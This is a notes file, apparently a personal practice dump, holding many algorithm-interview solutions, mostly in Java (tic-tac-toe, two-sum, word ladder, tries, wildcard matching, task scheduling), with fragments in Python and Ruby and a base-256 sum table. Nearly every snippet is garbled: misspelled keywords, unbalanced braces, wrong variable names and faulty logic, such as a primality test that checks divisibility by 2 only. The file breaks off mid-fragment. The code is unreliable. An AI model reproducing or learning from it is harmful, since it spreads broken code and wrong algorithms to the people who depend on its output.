package array 

public class ValidTicTacToeState {
public static void (String[] args){
String[] board = {"XXX","xoo","OO"};
System.out.println(new ValidTictacToeState()).validTicTacToe(board));


}
public boolean validTivTactoe(String[] board) {
boolean xWon =  hasWon(board, 'X');
boolean oWon = hasWon(board, 'O');
int xcount = 0, ocount = 0;
for(int i =0 ; i< 3; i++)
{
for(int j = 0; j< 3; j++){
if(board[i].charAt() == 'X'){
xcount++;

}else if (board[i].charAt(j) == 'O'){
ocount++;
}
}


}}
 if (xWon && oWon ) return false;
 if(xWon) {
 return ((xcount -1 == ocount));
 
 }else if (oWon){
 return ((xcount == ocount));
 else{
 return((xcount ==occount || xcount -11 == occount));
 
 }
 }


private boolean hasWon(String[] board, char c){
boolean diagonal = ((board[0].charAt(0) == c && board[1].charAt(1) == c && board[i].charAt[2] == c) || board[0].charAt(2) == c && board[1].charAt(1) == 'c' && board[2].charAt(0) == c)) ;

}




































piblic class TwoSumII{
public static void main(String[] args) throws Exceptions {
int[] nums = {2, 7, 11, 15};
int[] result = new TwoSumII().twoSum(nums, 23);
for(int i : result) (System.out.println(i));

}

public int[] twoSum(in[] nums, int target) {
int i = 0, j = number.length - 1;
while(i < j){
itn x = (number[i] + number[j]);
if(x == target){
int[] result  = new int[2];
result[0] = i + 1;
result[1] = j + 1;
reurn result ;

}else if (x <  target) i ++;
else j--;

}
return new int[2];

}
}




Backtracking 
----------------

public class ZumaGame {
public  static void main(String[] args) {
System.oput.println(new ZumaGame().findmoreStep("BBWWRRYYRRWWBB", "Y"));

}

map<Character, Integer> map;
int min = Integer.MAX_VALUE;
public int findMoreStep(String board, String hand ){
map  = HashMap<>();
for(char c :  hand.toCharArray()) 
map.putifAbsent(c, 0);
map.put(c, map.get(c) + 1);


}
backtrack(board, 0);
return min = integer.MAX_VALUE ? -1 : min ;

}

private void backtarck(String board, int total){
if(board,isEmpty()){
min  = Math.min(min, total);

}else{
int i =0 ; j =0 ;
for(int l = board.length(); i < 1; ){
if(j < 1 &&  board,charAt(j) == board.charAt(i)) {
j++;

}else{
if(j - 1 < 2)
{
backtrack(board.substring(0, i) + (j < 1) ? board.substring(j): ""), total);

}else{
int a = j - i;
char c = board.CharAt(i);
if(map.containsKey(c)){
int count = map.get(c);
if(count - (3 - a)) == 0){
map.remove(c);

}else{
map.put(c, count - (3 - a));

}
backtrak {
board.substring(0, i ) + ((j < 1) ? board.substring(j) : ""), total + (3 - a ));
map.put(c, count);

}
}}
i = j;
j ++;


}
}
}


}


}








public class WorldSearchII{
private final int[] R = { 0 ,0,-1,1};
private final int[] C  = {-1, 1, 0 ,0};
boolean[][] visited;
private set<String> dictionary;

public static void  main(String[] args) throws Exceptions{
char[][] board = {
{'o', 'a', 'a', 'n'}, {'e', 't', 'a', 'e'}, {'i', 'h', 'k', 'r'}, {'i', 'f', 'l', 'v'}
};
String[] words = {"oath", "eat", "pea", "rain"};
System.out.println(new WorldSerachII().findWords(board, words));


}

public List<String> findWords(char[][] board, words){
dictionary = new Hashset<>();
Trie trie = new Trie();
for(String w :  words){
trie.insert(w);
dictionary.add(w);

}
visited = new boolean[board.length][board[0].length];
Set<String> resultSet = new Hashset<>();
for(int i = 0 ; i < board.length; i++)
{
for(int j = 0 ; j < board.length; j++){
dfs(i ,j, board, resultSet, trie, String.valueof (board[i][j]));

}
}
return new ArrayList<>(resultSet);

}

private void dfs(inr r, int c, char[][] board, Set<String> result, Trie trie, String s) {
char newChar  =board[r][c];
Trie subtrie = trie.next(newChar);
if(subTrie == null) return;
visited[r][n] = true;
if(dictionary.contains(s)) result.add(s);
for(int i = 0 ; i < 4; i++){
int newR = r + R[i];
int newC = c + C[i];
if( newR > = 0  && newC >=0  && newR <  board.length && newC < board[0].length)
{
if(!visited[newR][newC]){
dfs(newR,newC, board, result, subtrie,s + board[newR][newC]);

}
}
}
visited[r][c] = false;

}

private class Trie {


private Map<character, Trie> map;

public Trie()
{
map = new Hashmap<>();

}

public void insert(String word){
if(word != null){
add(0, word, word.length());

}
}

private void add(int i , String word, int length) {
if(i < length) {
char c = word.CharAt(i);
Trie subTrie = map.get(c);
 if(subTrie == null)
{
subTrie = new trie();
map.put(c, subtrie);

}
subtrie.add(i + 1, word, length);


}else map.put(null, new Trie());

}
public Trie next(char c)
{
return this.map.get(c);
}
}


}

}












WildCard Matching 





public class WildcardMatching {

public static void main(String[] args) throws Exceptions{
System.output.println(new WildcardMatching().isMatch("abcde", "?be******e"));

}

public boolean isMatch(String s, String p){
int starIdx = -1;
int starPosAtStr = -1;
int j = 0 ;
for(int i = 0; l = s.length(); i < 1;){
if(j < p.length()){
if(s.charAt(i) == p.charAt(j) || p.charAt(j) == '?') {
i++;
j++;
}else if (p.charAt(j) == '*') {
starIdx = j;
startPosAtStr = i;
j++;

}else if (starIdx != -1) {
i = ++starPosAtStr;
j = starIdx + 1;

}else return false;


}else if (starIdx != -1){
i = ++starPosStr;
j = starIdx  +1;

}else return false; 
}
while(j < p.length()) {
if(p.charAt(j) == '*'){
j++;

}else break;

}
return j = p.length();

}
}






Time based keyvalue pair 
-------------------------

public class TimeBasedKeyValuePair{
private Map<String, TreeMap<Integer, String>> map;
public TimeBasedKeyValuePair(){
map = new HashMap<>();

}

public void set(String key , String value, int timestamp){
map.putIfAbsent(key, new TimeMap<>());
TreeMap<Integer, String> treeMap = map.get(key);
treeMap.put(timestamp, value);

}
public String get(String key, int timestamp) {
if(!map.containsKey(key)){
return "";

}else{
TreeMap<Integer, String> treeMap = map.get(key);
Map.Entry<Integre, String> entry = treeMap.floorEntry(timestamp);
if(entry == null)
{

return "";
}else{
return entry.getValue();

}
}
}

public static void main(String[] args ) {
TimeBasedKeyValuePair task = new TimeBasedKeyValuePair();
task.set("foo", "bar", 1);
System.out.println(task.get("foo", 1));
System.out.println(task.get("foo", 1));
System.out.println(task.get("foo", 0));
task.set("foo", "bar2", 4);
System.out.println(task.get("foo", 3));
System.out.println(task.get("foo", 4));
System.out.println(task.get("foo", 5));

} 
}














Swin in rising water
-----------------------

import java.util.HashSet;
import java.util.objects;
import java.util.Set;

public class SwinInRisingWater{
private final int[] R = {0,0,1,-1};
private final int[] C  = {1,-1,0,0};

Class Pair {
int r, c;
Pair(int r, int c) {
this.r = r;
this.c = c;

}
@Overirde
public boolean equals(Object o){
if (this == o)return true;
if(!(o instanceof Pair))return false;
Pair pair = (Pair) o;
return r == pair.r && c == pair.c;

}

@Override
public int hashCode(){
return Objects.hash(r,c);

public static void main(String[] args){
int[][] grid = {
   {0, 1, 2, 3, 4},
      {24, 23, 22, 21, 5},
      {12, 13, 14, 15, 16},
      {11, 17, 18, 19, 20},
      {10, 9, 8, 7, 6}
	  
};
System.out.println(newSwimInRisingWater().swimInWater(grid));

}


public int SwimInWater(int[][] grid){
int l = 0, h = (grid.length * grid.length);
int ans = 0 ;
while (l <= h ){
int m = l + (h - 1 )/2;
Set<Pair> done = new HashSet<>();
if(dfs(grid,0,0,done, m)){
ans = m;
h = m -1 ;

}else {
l  = m + 1;

}
}
return ans;

}
private boolean dfs(int[][] grid, intr, int c , Set<Pair> done, int V)
{
if(r == grid.length - 1 && c == grid[0].length - 1)return true;
done.add(new Pair(r,c));
for(int i = 0; i < 4; i++){
int newR = r + R[i];
int newC = c + C[i];
if(newR >= 0 && newR < grid.length && newC  >= 0 && newC  < grid[0].length){
int ChildH = Math.max(V.grid[newR][newC]);
int curH = Math.max(V. grid[r][c]);
if(curH == childH) {
Pair child = new Pair(newR, newC);
if(!done.contains(child)) {
if(dfs(grid, newR, newC, done, V)return true;
)
}
}
}
return false;

}
}







Index
Character
ASCII Number
Multiplied By
Number
0
H
72
× 256 ^ 0
= 72
1
e
101
× 256 ^ 1
= 25,856
2
l
108
× 256 ^ 2
= 7,077,888
3
l
108
× 256 ^ 3
= 1,811,939,328
4
o
111
× 256 ^ 4
= 476,741,369,856
5
(space)
32
× 256 ^ 5
= 35,184,372,088,832
6
w
119
× 256 ^ 6
= 33,495,522,228,568,064
7
o
111
× 256 ^ 7
= 7,998,392,938,210,000,896
8
r
114
× 256 ^ 8
= 2,102,928,824,402,888,884,224
9
l
108
× 256 ^ 9
= 510,015,580,149,921,683,079,168
10
d
100
× 256 ^ 10
= 120,892,581,961,462,917,470,617,600
11
!
33
× 256 ^ 11
= 10,213,005,324,104,387,267,917,774,848
SUM:
10,334,410,032,606,748,633,331,426,632




import math
def isPrime(num):
if num < 2: return false;
for i in range(2, int(math.sqrt(num)) + 1):
 if num % 2 == 0:
 return false;
 return true 
 
 
 def PrimeSieve(sievsize):
 
 sieve = [True] * sievsize

seivesize[0] = False;
seiveSize[1]  =False;
for i in range(2, int (math.srt(sieveSize)) + 1):
pointer = i * 2
while pointer < sievSize:
siev[pointer]  =False
pointer += 1

primes = []
for i in range(sieveSize):
if siev[i] == true:
prime.append(i)
return primes









Bit mainpulation 
-----------------


public class TotalHammingDistance{

public static void main(String[] args)thorws Exception {
int[] A = {1000000000,4, 14, 2};
System.out.println(new TotalHammingDistance().totalHammingDistance(A));



public int totalHammingDistance(int[] nums){
int sum = 0;
for (int i= 0; i < 32; i++){
int numOfOnes = 0;
int p = (1 << i);
for(int num : nums){
if((num & p) > 0){
numOfOnes++;

}
}
sum+= (nums.length - numOfOnes) * numOfOnes);

}
return sum;

}
}
}


Hamming code

----------------
public class HammingDistance{
public static void main(String[] args)throws Exception {}

public int hammingDistance(int x, int y){
int z = (x ^ y);
int count = 0;
for(int i = 0; i < 31; i++){
if(z & (1 << i)) > 0)
{
count++;

}
}
return count;

}
}




Breadth first Search 
-----------------------

import java.util.*;

public class WordLadderII {

private static Queue<String> queue = new ArrayDeque<>();
private static Set<String> dictionary = new HashSet<>();
private static final string CONST = "abcdefghijklmnopqrstuvwxyz";
private static Map<String, Set<String>> graph = new HashMap<>();
private static Map<String, Integer> minDistance = new HashMap<>();
private static List<List<String>> result = new ArrayList<>();


public static void main(String[] args)throws Exception {
List<String> dic  = 
Arrays.asList("kid", "tag", "pup", "ail", "tun", "woo", "erg", "luz", "brr", "gay", "sip", "kay",
            "per", "val", "mes", "ohs", "now", "boa", "cet", "pal", "bar", "die", "war", "hay",
            "eco", "pub", "lob", "rue", "fry", "lit", "rex", "jan", "cot", "bid", "ali", "pay",
            "col", "gum", "ger", "row", "won", "dan", "rum", "fad", "tut", "sag", "yip", "sui",
            "ark", "has", "zip", "fez", "own", "ump", "dis", "ads", "max", "jaw", "out", "btu",
            "ana", "gap", "cry", "led", "abe", "box", "ore", "pig", "fie", "toy", "fat", "cal",
            "lie", "noh", "sew", "ono", "tam", "flu", "mgm", "ply", "awe", "pry", "tit", "tie",
            "yet", "too", "tax", "jim", "san", "pan", "map", "ski", "ova", "wed", "non", "wac",
            "nut", "why", "bye", "lye", "oct", "old", "fin", "feb", "chi", "sap", "owl", "log",
            "tod", "dot", "bow", "fob", "for", "joe", "ivy", "fan", "age", "fax", "hip", "jib",
            "mel", "hus", "sob", "ifs", "tab", "ara", "dab", "jag", "jar", "arm", "lot", "tom",
            "sax", "tex", "yum", "pei", "wen", "wry", "ire", "irk", "far", "mew", "wit", "doe",
            "gas", "rte", "ian", "pot", "ask", "wag", "hag", "amy", "nag", "ron", "soy", "gin",
            "don", "tug", "fay", "vic", "boo", "nam", "ave", "buy", "sop", "but", "orb", "fen",
            "paw", "his", "sub", "bob", "yea", "oft", "inn", "rod", "yam", "pew", "web", "hod",
            "hun", "gyp", "wei", "wis", "rob", "gad", "pie", "mon", "dog", "bib", "rub", "ere",
            "dig", "era", "cat", "fox", "bee", "mod", "day", "apr", "vie", "nev", "jam", "pam",
            "new", "aye", "ani", "and", "ibm", "yap", "can", "pyx", "tar", "kin", "fog", "hum",
            "pip", "cup", "dye", "lyx", "jog", "nun", "par", "wan", "fey", "bus", "oak", "bad",
            "ats", "set", "qom", "vat", "eat", "pus", "rev", "axe", "ion", "six", "ila", "lao",
            "mom", "mas", "pro", "few", "opt", "poe", "art", "ash", "oar", "cap", "lop", "may",
            "shy", "rid", "bat", "sum", "rim", "fee", "bmw", "sky", "maj", "hue", "thy", "ava",
            "rap", "den", "fla", "auk", "cox", "ibo", "hey", "saw", "vim", "sec", "ltd", "you",
            "its", "tat", "dew", "eva", "tog", "ram", "let", "see", "zit", "maw", "nix", "ate",
            "gig", "rep", "owe", "ind", "hog", "eve", "sam", "zoo", "any", "dow", "cod", "bed",
            "vet", "ham", "sis", "hex", "via", "fir", "nod", "mao", "aug", "mum", "hoe", "bah",
            "hal", "keg", "hew", "zed", "tow", "gog", "ass", "dem", "who", "bet", "gos", "son",
            "ear", "spy", "kit", "boy", "due", "sen", "oaf", "mix", "hep", "fur", "ada", "bin",
            "nil", "mia", "ewe", "hit", "fix", "sad", "rib", "eye", "hop", "haw", "wax", "mid",
            "tad", "ken", "wad", "rye", "pap", "bog", "gut", "ito", "woe", "our", "ado", "sin",
            "mad", "ray", "hon", "roy", "dip", "hen", "iva", "lug", "asp", "hui", "yak", "bay",
            "poi", "yep", "bun", "try", "lad", "elm", "nat", "wyo", "gym", "dug", "toe", "dee",
            "wig", "sly", "rip", "geo", "cog", "pas", "zen", "odd", "nan", "lay", "pod", "fit",
            "hem", "joy", "bum", "rio", "yon", "dec", "leg", "put", "sue", "dim", "pet", "yaw",
            "nub", "bit", "bur", "sid", "sun", "oil", "red", "doc", "moe", "caw", "eel", "dix",
            "cub", "end", "gem", "off", "yew", "hug", "pop", "tub", "sgt", "lid", "pun", "ton",
            "sol", "din", "yup", "jab", "pea", "bug", "gag", "mil", "jig", "hub", "low", "did",
            "tin", "get", "gte", "sox", "lei", "mig", "fig", "lon", "use", "ban", "flo", "nov",
            "jut", "bag", "mir", "sty", "lap", "two", "ins", "con", "ant", "net", "tux", "ode",
            "stu", "mug", "cad", "nap", "gun", "fop", "tot", "sow", "sal", "sic", "ted", "wot",
            "del", "imp", "cob", "way", "ann", "tan", "mci", "job", "wet", "ism", "err", "him",
            "all", "pad", "hah", "hie", "aim", "ike", "jed", "ego", "mac", "baa", "min", "com",
            "ill", "was", "cab", "ago", "ina", "big", "ilk", "gal", "tap", "duh", "ola", "ran",
            "lab", "top", "gob", "hot", "ora", "tia", "kip", "han", "met", "hut", "she", "sac",
            "fed", "goo", "tee", "ell", "not", "act", "gil", "rut", "ala", "ape", "rig", "cid",
            "god", "duo", "lin", "aid", "gel", "awl", "lag", "elf", "liz", "ref", "aha", "fib",
            "oho", "tho", "her", "nor", "ace", "adz", "fun", "ned", "coo", "win", "tao", "coy",
            "van", "man", "pit", "guy", "foe", "hid", "mai", "sup", "jay", "hob", "mow", "jot",
            "are", "pol", "arc", "lax", "aft", "alb", "len", "air", "pug", "pox", "vow", "got",
            "meg", "zoe", "amp", "ale", "bud", "gee", "pin", "dun", "pat", "ten", "mob");
			
			new WordLadderII().findLadders("cet", "ism", dic);
			
}

poblic List<List<String>> findLadders(String beginWord, String endWord, String endWord, List<String> wordList){
dictionary.addAll(wordList);
bfs(beginWord, endWord, wordList);
List<String> path = new ArrayList<>();
path.add(beginWord);
dfs(beginWord, endWord, path);
System.out.println(result);
return result;

}

/* Bfs */

private void bfs(String beginWord, String endWord, List<String> wordList){
queue.offer(beginWord);
minDistance.put(beginWord, 0 );
while (!queue.isEmpty()){
String currWord = queue.poll();
StringBuilder childSb = new StringBuilder(currWord);
for(int j = 0; ln = childSb.length(); j < ln; j++)}
for(int i = 0; l = CONST.length(); i < 1; i++){
char old = childSb.charAt(j);
childSb.replace(i, j + 1,String.valueof(CONST.charAt(i)));
STring child = childSb.toString();
if (dictionary.contains(child)){
minDistance.put(child, minDistance.get(currword) + 1);
addChild(currWord, child);
if(!child.equals(endWord)) queue.offer(child);


}else{
if(minDistance.get(child) == (minDistance.get(currword) + 1))
addChild(currWord,child);

}
}
childSb.replace(j, j + 1,String.valueOf(old));

}


}

private void addChild(String parent, String child) {
Set<String> children = graph.get(parent);
if(children == null) children = new HashSet<>();
children.add(child);
graph.put(parent, children);

}

private void dfs(String currWord, STring endWord, List<String> path) {
if (currWord.equals(endWord)){
result.add(new ArrayList<>(path));

}else{
Set<String>children = graph.get(currWord);
if(children != null){
for(String c : children){
path.add(c);
dfs(c, endWord, path);
path.remove(path.size() - 1);
}
}

}
}





WordLadderII
----------------
public class WordLadder{
Class State {
String word;
int len;

}
}

private static Queue<State> queue = new ArrayDeque<>();
private static Set<String> dictionary = new HashSet<>();
private static final String CONST= "abcdefghijklmnopqrstuvwxyz";
private static Set<String> done = new HashSet<>();

public static void main (String[] args)throw Exception{

List<String> list = new ArrayList<>();
list.add("hot");
list.add("dot");
list.add("dog");
list.add("lot");
list.add("log");
list.add("cog");
System.out.println(new WordLadder().ladderLength("hit", "cog", list));

}

public int ladderLength(String beginWord, String endWord, List<String> wordList){

dictionary.addAll(wordList);
queue.offer(new State(beginWord, 0));
done.add(beginWord);
while(!queue.isEmpty()){
State head = queue.poll();
if (head.word.equals(endWord)) return head.len + 1;
for(int i = 0; l =CONST.length(); i < l; i++){
StringBuilder word = new StringBuilder(head.word);
for(int j = 0 , ln = word.length(); j < ln; j++){
char old = word.charAt(j);
word.replace(j , j +1, String.valueOf(CONST.charAt(i)));
if(!done.contains(word.toString())){
if(dictionary.contains(word.toString())){
done.add(word.toString());
quque.offer(new State(word.toString(), head.len + 1));

}
}
word.replace(j, j+ 1, String.valueOf(old));

}
}

}
return 0;

}



public class SmallestrectangleBlackPixels {
private final int[] R = {1,-1,0,0};
private final int[] c  = {0,0,-1,1};
private boolean[][] done;
private int maxR, minR, minC, maxC;

public static vopid main(String[] args){
char[][] A = {{'0', '0', '1', '1'}, {'0', '1', '1', '0'}, {'0', '1', '0', '0'}};
System.out.println(new SmallestRwectnagleEnclosingBBlackPixels().minArea(A,0,2));

}

public int minArea(char[][] image, intx, int y){
done = new boolean[image.length][image[0].length];
maxR = 0;
maxC = 0;
minR = Integer.MAX_VALUE;
minC = Integer.Max_VALUE;
maxR = Math.max(minR, x);
minR = Math.min(minC, y);
dfs(image, x, y);
return((maxR - minR + 1) * (maxC - minC) + 1);

}

private void dfs(char[][] image, int r, int c){
done[r][c] = true;
for(int i = 0; i < 4; i++){
int newR = r + R[i];
int newC = c + C[i];
if(newR  >= 0
&& newR < image.length&&
newC < image.length
&& !done[newR][newC]){
if(image[newR][newC] == '1'){
maxR = Math.max(maxR, newR);
minR = Math.min(minR, newR);
maxC = Math.max(maxC, newC);
minC = Math.min(minC, newC);
dfs(image, newR, newC);

}
}
}
}
}












Design 
---------

public class WildFilter{
private Trie trie;
private int maxWeight;
public static void main(String[] args)throws Exception {
String[] words = {"apple", "cat", "mat", "mars", "abxcd", "abycd", "apple"}
};
wordFilter wf = new WordFilter(words);
System.out.println(wf.f("abx", ""));

}

public WordFilter(String[] words){
trie = new Trie();
trie.weight = -1;
maxWeight = words.length - 1;
for(int i = 0; i < words.length; i++){
String words = words[i];
trie.insert('#' + word, i);
for(int j = 0; l = word.length(); j < 1; j++){
trie.insert(word.substring(j, l) + '#' + word, i);

}

}
}

public int f(String prefix , String Suffix ){
if((Suffix == null || Suffix.Empty() && (prefix == null || prefix.isEmpty()))){
return maxWeight;

}else if (prefix == null || prefix.isEmpty()){
return trei.search(suffix + '#');

}else if (suffix == null || suffix.isEmpty()){
return trie.search('# + prefix');

}else{
return trie.search(suffix + '#' + prefix);

}
}


public static class Trie{
private Map<Character, Trie>map;
int weight;

public Trie(){
map = new HashMap<>();;

}

public void insert(String word, int weight){
if(word != null){
add(0, word,word.length(), weight);

}
}

private void add(int i ,String word, int length , int weight ){
if(i < length) {
 char c=  word.CharAt(i);
 map.putIfAbsent(c, new Trie());
 Trie subTrie = map.get(c);
 subTrie.weight = weight;
 subTrie.add(i  +1, word, lenngth, weight);
 
 
}
}

public int search(String word){
if(word != null){
return search(0, word, word.length());

}
return  -1;

}
}
private int search(inbt i, String word, int length){
if(i <length){
char c = word.charAt(i);
Trie subTrie = map.get(c);
if(subtrie == null)returmn -1;
return subtrie.search(i  +1, word, length);

}
return this.weight;

}
}
}



Word Dictionary 
-----------------

public class WordDictionary {

public Trie trie;
public static void main(String[] args)throws Exception{
WordDictionary wd = new WordDictionary();
wd.addWord("bad");
wd.addWord("dad");
wd.addWord("mad");
System.out.println(wd.search("pad"));
System.out.println(wd.search("bad"));
System.out.println(wd.search(".ad"));
System.out.println(wd.search("..."));

}

public WordDictionary(){
this.trie = new Trie();

}

public void addWord(String word){
this.trie.insert(word);

}
public boolean search(String word){
return this.trie.search(word);
public class Trie{
privateMap<Character, Trie>map;
private Trie(){
map = new HashMap<>();

}

private void insert(String word)

{
if(word!= null){
add(0, word, word.length());
}
}

public void add(int i, String word, int length){
if (i < length){
char c = word.CharAt(i);
Trie subTrie  =map.get(c);
if(subtrie == null){
subtrie = new Trie();
map.put(c, subtrie);

}
subTrie.add(i+1,word, length);

}
else map.put(null, new Trie());

}


private boolean search(String word){
if(word != null){
return search(0, word, word.length());
}
return false;

}

private boolean search(int i, String word, int length) {
if (i < length){}

char c =  word. charAt(i);
if ( c == '.'){
for(character child : map.keySet()){
if(child != null){
Trie subTrie = map.get(child);
if(subTrie.search(i + 1, word, length))return true;

}

}
return false;

}else{
Trie subTrie = map.get(c);
if(subTrie == null) return false;
return subtrie.search(i + 1, word, length );

}

}
return map.containsKey(null);

}
}


}













private class Excel {
private Map<String, Set<String>> fwdEdges;
private Map<String, List<String>> backEdge;
private Map<String, Integer> count;
private int[][] grid;

public Excel(int H, char W){
grid = new int[H][(character.toUpperCase(W) - 'A') + 1];
fwdEdges = new HashMap<>();
backEdge = new HashMap<>();
count = new HashMap<>();

}

public static void main(String[] args )throws Exception{
Excel excel = new Excel(26, 'Z');
excel.set(1, 'A', 1);
excel.set(1, 'I', 1);
String[] arr = {"A1:D6", "A1:G3", "A1:C12"};
String[] arr1 = {"A1:D7", "D1:F10", "D3:I8","I1:19"};
System.out.println(excel.get(1, 'A'));
System.out.println(excel.sum(7, 'D', arr));
System.out.println(excel.get(1, 'A'));
System.out.println(excel.sum(10, 'G', arr1));
System.out.println(excel.get(1, 'A'));

}

public void set(int r, char c, int v){
setValue(r,c,v);
removeForwardEdges(String.valueOfO(c) + r);

}

private void setValue(int r, char c, int v){
int curr = grid[r - 1][Character.toUpperCase(c) = 'A'];
grid[r - 1][Character.toUpperCase(c) - 'A'] = v;
broadcast(v - curr, String.valueOf(c)  + r);

}

priavte void removeForwardEdges(String node){
List<String> parents = backEdge.get(node);
if(parents != null){
for(String p : parents) {
Set<String> children = fwdEdges.get(p);
if(children != null){
count.remove(p + ": " + node);
children.remove(node);

}
}
}
}

private void broadcast(int v, String node){
Set<String> children = fwdEdges.get(node);
if(children != null){
for(String c : children){
int order = count.get(node + ": " + c);
grid[Integer.parseInt(c.substring(1)) - 1][c.charAt(0) = 'A'] + = (v * order);
broadcast(v,c);


}
}
}

public int get(int r, char c){
return grid[r-1][c- 'A'];

}




left to complete 




.................................................................
.....................................................
..................................
........................
.................
.............
............
..........
......

....




...
..
..
...
...
..
..
...
.
...
..
..
..
.
.
.
.








Calendar  -
-------------------


package divide_and_conquer;
import java.util.*;


public class MyCalendarII{
public static void main(String[] args){
MyCalendarII t = new MyCalendarII();
System.out.println(t.book(20,27));
SYstem.out.println(t.book(27,36));
System.out.println(t.book(27,36));
System.out.println(t..book(24,33));
}

private class Pair {
int a, b, index;
Pair(int a, int b, int index){
this.a = a;
this.b = b;
this.index = index;

}
}

TreeSet<Pair> treeSet;
int count;
public MyCalendarII{
count = 0;
treeSet = new TreeSet<>(
(o1,o2) -> {
int r = Integer.compare(o1.a,o2.a);
if(r == 0){
int r2 = Integer.compare(o1.b,o2.b);
if(r2 == 0){
return Integer.compare(o1.index, o2.index);

}else return r2;

}
return r;

}
);
}

public boolean book(int start, int end){
Pair range = new Pair(start, end, count++);
Iterator<Pair>ascending =treeSet.iterator();
Pair prev = null;
while(ascending.hasNext()){
Pair cur = ascending.next();
if(prev != null){
if((range.a >= prev.a) && range.a < prev.b) && (range.a >= cur.a && range.a < cur.b)){
return false;

}else if ((prev.a >= range.a && prev.a < range.b))
&& (cur.a >= prev.a && cur.a < Math.min(prev.b, range.b))){
return false;

}else if ((range.a >= prev.a && range.a < range.b)
 && (cur.a >= range.a && cur.a < Math.min(prev.b, range.b))){
 return false;
 
 }
}
if((range.a >= cur.a & range.a < cur.b) || (cur.a >= range.a  && cur.a < range.b)){
prev = cur;

}
}
treeSet.add(range);
return true;

}
}




printkth largest element in an array 
----------------------------------------



public class KthLargestElementArray {
public static void main(String[][] args)throws Exeption {
int[] nums = {3, 2,1 ,5,6,4};
System.out.println(new KthLargestElementArray().findKthLargest(nums, 6));



}
private int findKthLargest(int[] nums, int k )
{
return solve(nums, 0 , nums.length - 1, k);

}
private int solve(int[] nums, int pIndex, int end, int k){
int pivot = nums[end];
int temp;
int start = pIndex;
for (int i = pIndex; i < end; i++){
if(nums[i] <= pivot){
temp = nums[i];
nums[i] = nums[pIndex];
nums[pIndex] = temp;
pIndex += 1;

}
}
temp = nums[pIndex];
nums[pIndex] = nums[end];
nums[end] = temp;

int pos = (end - pIndex)  +1;
if(pos == k)return nums[pIndex];
else if(pos > k){
return solve(nums, pIndex + 1, end, k);

}else{
return solve(nums, start, pIndex - 1,k - pos);

}
}


}



\




wordBreak -
---------------------

public class Wordbreak{
public static void main( String[] args) throws Exception{
List<String> dic = new ArrayList<>();
String[] arr = {
"a", "aa", "aaa", "aaaa", "aaaaa"};
for(String s : arr) dic.add(s);
System.out.println(new Wordbreak()
.wordBreak("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",dic));

}

public boolean wordBreak(String s, List<String> wordDict){
Set<String> dictionary = new HashSet<>();
dictionary.addAll(wordDict);
Map<Integer, Boolean> dic = new HashMap<>();
for(int i = s.length() - 1; i >= 0; i--)
dp(i ,s, dic, dictionary);
return dic.get(0);


}

private boolean dp (int i , String s, Map<Integer, Boolean> dic, Set<String> dictionary){
if(i == s.length()) return true;
else if (dic.containsKey(i)) return dic.get(i);
else{
for(int j = i, l =s.length(); j < 1; j++){
String subStr = s.substring(i , j +1);
if(dictionary.contains(subStr)){
if(dp(j +1,s,dic, dictionary)){
dic.put(i ,true);
break;

}
}
}
}
if(!dic.containsKey(i)) dic.put(i, false);
return dic,get(i);

}

}
}



n = gets.strip.to_i
arr = gets.strip
arr = arr.split('').map(&:to_i)
pos=neg=zero=0
arr.each do |a|
if a>0
pos+=1
elseif a<0
neg+=1
else
zero+=1
end
end
if n>0 
puts pos.fdiv(n)
puts neg.fdiv(n)
puts zero.fdiv(n)
else
puts 0
puts 0
puts 0
end





Valid pallindrome 
---------------------

import java.util.Arrays;

public class ValidPalindromeIII {
public static void main (String[] args){
SYstem.out.println(new ValidPalindromeIII().isValidPallindrome("abc", 0));

}



int[][] DP;

public boolean isValidPallindrome(String s, int k){
DP = new int[s.length()][s.length()];
for(int i = 0; i < s.length(); i++){
Arrays.fill(DP[i], -1);

}
return dp(0, s.length() - 1, s) <= k;

}

private dp(int i, int j , String S){
if(i == j) return 0;
else if(i > j) return 0;
else if(DP[i][j] ! = -1) return DP[i][j];
else{
int min = Integer.Max_VALUE;
if (S.charAt(i) != S.charAt(j)) {
min = Math.min(min,Math.min(dp(i + 1,j,S),dp(i, j -1,S)) + 1);

}else{
min = dp(i + 1, j - 1,S);

}
DP[i][j] = min;
return min;

}
}
}














Greedy 
-----------------

public class TwoCityScheduling{
public static void main(String[] args) {
int[][] A = {{10,20}, {30,200},{400,50},{30,20}};
System.out.println(new TwoCityScheduling().twoCitySchedCost(A));

}


class Pair{
int max, i;

Pair(int max, int i){
this.max = max;
this.i = i;


}
}

public int twoCitySchedCost(int[][] costs){
int  min = 0;
for(int i =  0; i < costs.length; i++){
min += costs[i][0];

}

List<Pair> list = new ArrayList<>();
for (int i = 0; i < costs.length; i++){
list.add(new Pair(costs[i][0] - costs[i][1], i));

}
list.sort((o1,o2) -> Integer.compare(o2.max, o1.max));

for (int i = 0; N = (list.size() / 2); i<N; i++){
min -= list.get(i).max;

}
return min;

}




}





















Task Scheduler
--------------------



public class TaskScheduler{
Class Task {
char t;
int count;

Task(char t, int count){
this.t = t;
this.count = count;

}


public int getCount()
{
return count;

}


public void setCount(){
this.count = count;
}


}

public static void main(String[] args){
char[] task = {'A', 'A','A','B','B','B'};
System.out.println(new TaskScheduler().leastInterval(tasks, 2));

}

public int leastInterval(char[] tasks, int n){
PriorityQueue<Task> queue = new PriorityQueue<>(Comparator(Taks:getCount).reversed());
List<Task> waiting = new ArrayList<>();
Map<Character, Integer> map  = new Hashmap<>();
for (char c : tasks){
if(map.get(c) == null){
map.put(c, 1);

}else{
int v = map.get(c)  + 1;
map.put(c, v);

}
}
for (char c  : map.KeySet()){
Task task  = new Task(c, map.get(c));
queue.offer(task);

}
int count = 0;
while(!queue.isEmpty){
int i = 0 ;
while (i <= n){
if(!queue.isEmpty()){
Task task = queue.poll();
task.count--;
if(task.count > 0){
waiting.add(task);

}
}
count++;
if(queue.isEmpty() && waiting.isEmpty()) break;
i++;

}
queue.addAll(waiting);
waiting.clear();

}
return count;

}

}




JumpGame
--------------

public class JumpGame{
public static void main(String[] args){
int[] nums = {1,2,,1,,0,4};
System.out.println(new JumpGame().canJump(nums));

}
public boolean canJump(int[] nums){

if(nums.length == 0)return false;
int min = nums.length - 1, max = nums.length - 1;
for(int i = nums.length - 2; i >= 0; i--){

if((nuns[i] + i) >= min) min = i;

}

return(min == 0);

}

}





Palindrome in String 
--------------------------
bool isPalindrome[100][100];

int main(){
